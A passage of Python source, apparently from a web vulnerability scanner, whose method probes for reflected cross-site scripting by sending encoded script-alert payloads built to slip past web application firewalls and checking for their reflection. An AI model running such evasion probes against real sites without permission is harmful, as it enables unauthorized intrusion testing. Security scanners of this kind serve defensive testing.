        """XSS via WAF bypass (encoding)."""
        if not self.deep: return
        self._print("[*]", "XSS WAF bypass (encoding)...", "INFO")
        try:
            paths = ["/", "/search", "/page"]
            marker = hashlib.md5(
                (self.host + "wafen").encode()).hexdigest()[:8]
            payloads = [
                "%3Cscript%3Ealert('" + marker + "')%3C/script%3E",
                "&#60;script&#62;alert('" + marker + "')&#60;/script&#62;",
                "\\x3cscript\\x3ealert('" + marker + "')\\x3c/script\\x3e",
                base64.b64encode(("<script>alert('" + marker + "')</script>").encode()).decode(),
            ]
            for path in paths:
                for param in ["q", "name", "html"]:
                    for payload in payloads:
                        url = urljoin(self.target,
                                     path + "?" + param + "=" + payload)
                        r = self._get(url, timeout=8)
                        if r is None: continue
                        body = r.text or ""
                        decoded_hits = 0
                        if "%3Cscript" in payload:
                            decoded_hits = body.count("<script") + body.count("%3Cscript")
                        elif "&#60;" in payload:
                            decoded_hits = body.count("<script") + body.count("&#60;script")
                        elif "\\x3c" in payload:
                            decoded_hits = body.count("<script") + body.count("\\x3cscript")
                        else:
                            decoded_hits = body.count(marker)
                        if decoded_hits > 0 and marker in body:
                            self._add_vuln("XSS (WAF bypass - encoding)",
                                           "HIGH", url,
                                           "Encoded payload bypassed WAF - decoded in output: " + body[:200],
                                           method="GET", param=param)
                            return
        except Exception:
            pass



